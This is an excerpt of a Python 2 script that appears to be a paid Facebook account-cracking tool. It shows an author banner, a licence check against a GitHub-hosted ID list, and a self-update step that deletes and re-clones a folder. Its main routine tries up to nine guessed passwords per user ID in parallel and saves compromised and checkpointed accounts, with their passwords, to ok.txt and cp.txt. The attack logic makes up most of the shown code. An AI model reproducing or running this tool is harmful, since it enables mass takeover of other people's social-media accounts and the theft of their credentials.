...
logo = '\n\n\n##     ##    ##    ## #### ##    ##  ######   \n###   ###    ##   ##   ##  ###   ## ##    ##  \n#### ####    ##  ##    ##  ####  ## ##        \n## ### ##    #####     ##  ## ## ## ##   #### \n##     ##    ##  ##    ##  ##  #### ##    ##  \n##     ##    ##   ##   ##  ##   ### ##    ##  \n##     ##    ##    ## #### ##    ##  ######   \n\n--------------------------------------------------\x1a\n\x1a Author      : Okenwa Bright \n\x1a GitHub      : https://github.com/Okenwa24\n\x1a YouTube     : Technical Okenwa\n\x1a WhatsApp    : https://wa.me/+2347061758885\n Blogspot    : https://savage.blogspot.com\n--------------------------------------------------\n'
...
def mohammad():
    ...
    try:
        httpCaht = requests.get('https://github.com/SAVAGE-FUNDZ/PAID/blob/main/public.txt').text
        if id in httpCaht:
...
def method_menu_select():
    ...
    if afza == '1':
        ...
        print logo
        os.system('cp .... $HOME')
        os.system('rm -rf $HOME/PAID')
        os.system('cd $HOME && git clone https://github.com/SAVAGE-FUNDZ/PAID')
...
def b_menu_select():
    ...
    print ''
    os.system('echo -e "Created by Okenwa Bright Fast Tool\n\n\t   \n" | lolcat')
    time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'www.facebook.com' in d['error_msg']:
                print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' - ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass1
                ok = open('ok.txt', 'a')
                ok.write(uid + ' - ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
                ...
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' - ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass2
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' - ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                    ...
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' - ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass3
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' - ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                        ...
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' - ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass4
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' - ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                            ...
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' - ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass5
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' - ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                                ...
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' - ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass6
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' - ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass7
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass8
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass8 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mMOkenwa-OK ' + uid + ' - ' + pass8
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mSavage-CP ' + uid + ' - ' + pass9
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass9 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mOkenwa-OK ' + uid + ' - ' + pass9
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass9 + '\n')
                                        ok.close()
                                        oks.append(uid)
    ...
    p.map(main, id)
    print ' '
    os.system('echo -e "Saved\n\nTOTAL Okenwa-OK & Savage-CP\n" | lolcat')
    print '\x1b[0;92mOkenwa-OK > ' + str(len(oks))
    print '\x1b[0;93mSavage-CP > ' + str(len(cps))


if __name__ == '__main__':
    os.system('clear')
    print 'Created by Okenwa Bright '
    time.sleep(2)
    print ' '
    print 'Message me on whatsApp and send id  '
    time.sleep(2)
    print ' '
